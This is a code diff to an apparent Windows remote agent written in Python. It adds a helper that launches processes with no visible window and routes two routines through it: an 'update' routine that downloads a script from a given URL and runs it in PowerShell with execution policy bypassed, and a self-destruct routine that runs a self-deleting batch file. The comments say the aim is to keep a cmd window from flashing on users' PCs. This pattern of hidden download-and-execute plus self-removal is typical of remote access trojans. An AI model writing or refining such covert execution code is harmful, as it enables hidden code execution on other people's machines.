@@ -1024,6 +1024,36 @@ async def install_software(url: str) -> Tuple[str, bool]:
         return f"Install error: {e}", False
 
 
+def _spawn_hidden(args: list, cwd: Optional[str] = None) -> None:
+    """
+    Launch a process with no visible console window.
+
+    Do NOT combine CREATE_NO_WINDOW with DETACHED_PROCESS — Windows ignores
+    CREATE_NO_WINDOW when DETACHED_PROCESS is set, which can flash cmd.exe.
+    """
+    flags = 0
+    if hasattr(subprocess, "CREATE_NO_WINDOW"):
+        flags |= subprocess.CREATE_NO_WINDOW
+    if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
+        flags |= subprocess.CREATE_NEW_PROCESS_GROUP
+
+    startupinfo = None
+    if hasattr(subprocess, "STARTUPINFO"):
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= getattr(subprocess, "STARTF_USESHOWWINDOW", 1)
+        startupinfo.wShowWindow = 0  # SW_HIDE
+
+    subprocess.Popen(
+        args,
+        creationflags=flags,
+        startupinfo=startupinfo,
+        close_fds=True,
+        cwd=cwd,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
 
 async def update_agent(url: str) -> Tuple[str, bool]:
     """
@@ -1038,26 +1068,14 @@ async def update_agent(url: str) -> Tuple[str, bool]:
         if not url.startswith("http"):
              return "Invalid URL for update. Must be http/https", False
              
-        # Command to run the installer with -Silent flag so it won't prompt for input
-        # We wrap in a short delay to allow this request to report back first
-        # Uses ScriptBlock::Create to pass -Silent parameter to the downloaded script
-        ps_command = f"Start-Sleep -Seconds 5; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; & ([ScriptBlock]::Create((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content)) -Silent"
+        # Delay so this request can report back, then run installer content
+        ps_command = f"Start-Sleep -Seconds 5; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; & ([ScriptBlock]::Create((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))"
         
-        # Launch detached PowerShell
-        # Uses same technique as self_destruct to survive process kill
-        _detach = getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
-        _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0x00000200)
-        
-        subprocess.Popen(
+        _spawn_hidden(
             [
                 'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass',
                 '-WindowStyle', 'Hidden', '-Command', ps_command
-            ],
-            creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
-            close_fds=True,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            ]
         )
         
         return f"Update initiated using {url}. Agent will restart shortly.", True
@@ -1155,20 +1173,9 @@ del /f /q "%~f0"
         
         print(f"[SELF_DESTRUCT] Batch file written to: {bat_path}")
         
-        # Launch batch file completely detached from this process
-        # cmd.exe runs from System32 - it does NOT hold a lock on SystemCache
-        _detach = getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
-        _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0x00000200)
-        
-        subprocess.Popen(
-            ['cmd.exe', '/c', bat_path],
-            creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
-            close_fds=True,
-            cwd=temp_dir,  # Working dir is TEMP, not install dir
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
+        # Hidden launch (no DETACHED_PROCESS — that cancels CREATE_NO_WINDOW
+        # and can flash a visible cmd window on some PCs)
+        _spawn_hidden(['cmd.exe', '/c', bat_path], cwd=temp_dir)
         
         print("[SELF_DESTRUCT] Cleanup batch launched successfully")
         
